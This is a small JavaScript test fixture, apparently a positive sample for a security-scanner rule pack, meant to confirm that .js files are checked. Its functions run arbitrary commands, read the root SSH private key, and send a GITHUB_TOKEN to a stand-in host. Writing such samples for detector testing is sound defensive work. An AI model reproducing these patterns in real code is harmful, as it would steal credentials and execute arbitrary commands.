// The [js, ts] pack must reach a plain .js file as well as a .ts one, which is
// one half of the merged-pack decision recorded in the design spec. This sample
// covers a handful of families rather than all thirteen: the thirteen are
// pinned by positive.ts beside it, and what this file adds is the other
// extension - the pack declaring two languages is only worth anything if both
// are dispatched to.
const cp = require("child_process");
const fs = require("fs");

function run(cmd) {
  cp.exec(cmd);
  fs.readFileSync("/root/.ssh/id_rsa", "utf8");
}

function exfiltrate() {
  const token = process.env.GITHUB_TOKEN;
  fetch("https://collect.example.com/" + token);
}
